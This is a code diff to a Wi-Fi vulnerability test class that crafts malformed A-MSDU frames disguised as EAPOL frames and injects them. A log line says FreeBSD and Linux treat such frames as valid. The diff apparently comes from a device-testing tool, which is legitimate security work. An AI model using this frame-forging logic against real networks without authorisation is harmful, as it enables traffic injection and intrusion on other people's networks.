@@ -191,11 +191,22 @@ class EapolTest(Test):
 
 
 class EapolAmsduTest(Test):
+	"""
+	TODO: Combine this class with PingTest so we have more advanced argument handling
+	"""
+
 	def __init__(self, ptype, actions, freebsd=False, opt=None):
 		super().__init__(actions)
 		self.ptype = ptype
 		self.freebsd = freebsd
 		self.bcast_dst = False if opt == None else opt.bcast_dst
+		#TODO: More automatically control ptype and its arguments
+		self.dport = None if opt == None else opt.udp
+
+		actions = self.get_actions(Action.Inject)
+		if len(actions) != 1:
+			log(ERROR, f"eapol-amsdu: invalid arguments, should only give 1 inject action (gave {len(actions)}).")
+			quit(1)
 
 	def prepare(self, station):
 		log(STATUS, "Generating ping test", color="green")
@@ -204,8 +215,6 @@ class EapolAmsduTest(Test):
 		header, request, check_fn = generate_request(station, self.ptype)
 		# Set the A-MSDU frame type flag in the QoS header
 		header.Reserved = 1
-		# Testing
-		#header.addr2 = "00:11:22:33:44:55"
 
 		# We can automatically detect result if the last fragment was
 		# sent after the authentication
@@ -219,7 +228,7 @@ class EapolAmsduTest(Test):
 
 		# Masquerade A-MSDU frame as an EAPOL frame
 		if self.freebsd:
-			log(STATUS, "Creating malformed EAPOL/MSDU that FreeBSD treats as valid")
+			log(STATUS, "Creating malformed EAPOL/MSDU that FreeBSD/Linux/.. treats as valid")
 			request = freebsd_create_eapolmsdu(mac_src, mac_dst, request)
 		else:
 			request = LLC()/SNAP()/EAPOL()/Raw(b"\x00\x06AAAAAA") / create_msdu_subframe(mac_src, mac_dst, request)
@@ -234,12 +243,7 @@ class EapolAmsduTest(Test):
 			else:
 				toinject.addr1 = "ff:ff:ff:ff:ff:ff"
 
-		# XXX Where was this needed again?
-		auth = Dot11()/Dot11Auth(status=0, seqnum=1)
-		station.set_header(auth)
-		auth.addr2 = "00:11:22:33:44:55"
-
-		self.actions[0].frame = auth
-		self.actions[1].frame = toinject
-
+		# Note: previously I also sent an Auth to 00:..:55 but that doesn't seem to be needed.
+		actions = self.get_actions(Action.Inject)
+		actions[0].frame = toinject
 
